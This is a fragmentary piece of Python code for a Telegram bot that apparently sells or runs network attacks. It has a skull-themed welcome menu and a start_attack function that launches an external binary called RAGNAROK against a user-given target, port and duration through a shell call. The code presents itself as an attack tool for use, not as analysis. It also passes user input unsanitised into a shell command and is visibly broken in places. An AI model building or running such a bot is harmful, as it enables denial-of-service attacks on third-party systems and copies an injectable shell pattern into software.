...
def send_welcome(message):
    welcome_message = (
        "💀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘂𝗹𝘁𝗶𝗺𝗮𝘁𝗲 𝗯𝗼𝘁 ☠️\n\n" )

    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn_attack = types.KeyboardButton('🚀 Matrix')
...
def start_attack(user_id, target, port, duration):
    ...
    bot.send_message(message.chat.id, f"✅ Attack Successfully Executed.")
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./RAGNAROK {target} {port} {duration}", shell=True)
        time.sleep(5)
...
@bot.message_handler(func=lambda message: message.text == '🚀 Matrix')
